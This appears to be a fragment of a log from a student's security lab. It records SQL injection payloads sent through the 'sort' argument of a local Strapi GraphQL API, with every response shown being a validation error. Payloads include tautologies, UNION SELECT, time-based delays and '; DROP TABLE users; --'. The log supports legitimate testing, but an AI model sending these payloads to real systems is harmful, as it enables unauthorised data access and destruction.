+	Response: {"errors":[{"message":"Invalid key ' WAITFOR DELAY '0","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' WAITFOR DELAY '0","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' WAITFOR DELAY '0","details":{"key":"' WAITFOR DELAY '0","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { articles(sort: "' OR 'x'='x' /*") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key ' OR 'x'='x' /*","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR 'x'='x' /*","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR 'x'='x' /*","details":{"key":"' OR 'x'='x' /*","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { articles(sort: "' OR EXISTS(SELECT * FROM users)--") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key ' OR EXISTS(SELECT * FROM users)--","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR EXISTS(SELECT * FROM users)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR EXISTS(SELECT * FROM users)--","details":{"key":"' OR EXISTS(SELECT * FROM users)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=(SELECT COUNT(*) FROM tablename)--
+	Query: query { articles(sort: "' AND 1=(SELECT COUNT(*) FROM tablename)--") { documentId title } }
+	Response: {"errors":[{"message":"Invalid key ' AND 1=(SELECT COUNT(*) FROM tablename)--","path":["articles"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' AND 1=(SELECT COUNT(*) FROM tablename)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' AND 1=(SELECT COUNT(*) FROM tablename)--","details":{"key":"' AND 1=(SELECT COUNT(*) FROM tablename)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+[>] Testing authors_connection (string args: ['sort'])
+
+[>] Testing authors (string args: ['sort'])
+
+
+	Payload:  '
+	Query: query { authors(sort: " '") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key '","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key '","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key '","details":{"key":"'","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR '1'='1
+	Query: query { authors(sort: "' OR '1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR '1'='1","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR '1'='1","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR '1'='1","details":{"key":"' OR '1'='1","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR 1=1--
+	Query: query { authors(sort: "' OR 1=1--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR 1=1--","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR 1=1--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR 1=1--","details":{"key":"' OR 1=1--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR 'a'='a
+	Query: query { authors(sort: "' OR 'a'='a") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR 'a'='a","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR 'a'='a","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR 'a'='a","details":{"key":"' OR 'a'='a","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' UNION SELECT NULL--
+	Query: query { authors(sort: "' UNION SELECT NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' UNION SELECT NULL--","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' UNION SELECT NULL--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' UNION SELECT NULL--","details":{"key":"' UNION SELECT NULL--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: '; DROP TABLE users; --
+	Query: query { authors(sort: "'; DROP TABLE users; --") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key '; DROP TABLE users; --","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key '; DROP TABLE users; --","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key '; DROP TABLE users; --","details":{"key":"'; DROP TABLE users; --","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' AND 1=0 UNION SELECT NULL,NULL--
+	Query: query { authors(sort: "' AND 1=0 UNION SELECT NULL,NULL--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' AND 1=0 UNION SELECT NULL","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' AND 1=0 UNION SELECT NULL","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:18:71","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:18:53","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29"],"error":{"name":"ValidationError","message":"Invalid key ' AND 1=0 UNION SELECT NULL","details":{"key":"' AND 1=0 UNION SELECT NULL","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ') OR ('1'='1
+	Query: query { authors(sort: "') OR ('1'='1") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ') OR ('1'='1","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ') OR ('1'='1","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ') OR ('1'='1","details":{"key":"') OR ('1'='1","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: admin' --
+	Query: query { authors(sort: "admin' --") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key admin' --","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key admin' --","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key admin' --","details":{"key":"admin' --","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR sleep(5)--
+	Query: query { authors(sort: "' OR sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR sleep(5)--","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR sleep(5)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR sleep(5)--","details":{"key":"' OR sleep(5)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' AND sleep(5)--
+	Query: query { authors(sort: "' AND sleep(5)--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' AND sleep(5)--","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' AND sleep(5)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' AND sleep(5)--","details":{"key":"' AND sleep(5)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' WAITFOR DELAY '0:0:5'--
+	Query: query { authors(sort: "' WAITFOR DELAY '0:0:5'--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' WAITFOR DELAY '0","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' WAITFOR DELAY '0","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' WAITFOR DELAY '0","details":{"key":"' WAITFOR DELAY '0","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR 'x'='x' /*
+	Query: query { authors(sort: "' OR 'x'='x' /*") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR 'x'='x' /*","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR 'x'='x' /*","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR 'x'='x' /*","details":{"key":"' OR 'x'='x' /*","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
+	Payload: ' OR EXISTS(SELECT * FROM users)--
+	Query: query { authors(sort: "' OR EXISTS(SELECT * FROM users)--") { documentId name } }
+	Response: {"errors":[{"message":"Invalid key ' OR EXISTS(SELECT * FROM users)--","path":["authors"],"extensions":{"code":"BAD_USER_INPUT","stacktrace":["ValidationError: Invalid key ' OR EXISTS(SELECT * FROM users)--","    at Object.throwInvalidKey (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/utils.js:10:11)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:101:23","    at traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:68:19)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:47","    at Array.map (<anonymous>)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/query-sort.js:21:29","    at Function.traverse (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/traverse/factory.js:24:24)","    at Function.l (/home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/lodash/lodash.min.js:58:213)","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/async.js:9:33","    at /home/tomas/Desktop/KTH/Year1/P4/LBS/strapi/node_modules/@strapi/utils/dist/validate/validators.js:147:43"],"error":{"name":"ValidationError","message":"Invalid key ' OR EXISTS(SELECT * FROM users)--","details":{"key":"' OR EXISTS(SELECT * FROM users)--","path":null,"source":"query","param":"sort"}}}}],"data":null}
+
+
+
